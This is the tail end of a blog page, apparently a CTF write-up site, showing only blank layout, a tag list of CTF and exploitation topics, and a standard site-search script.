    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

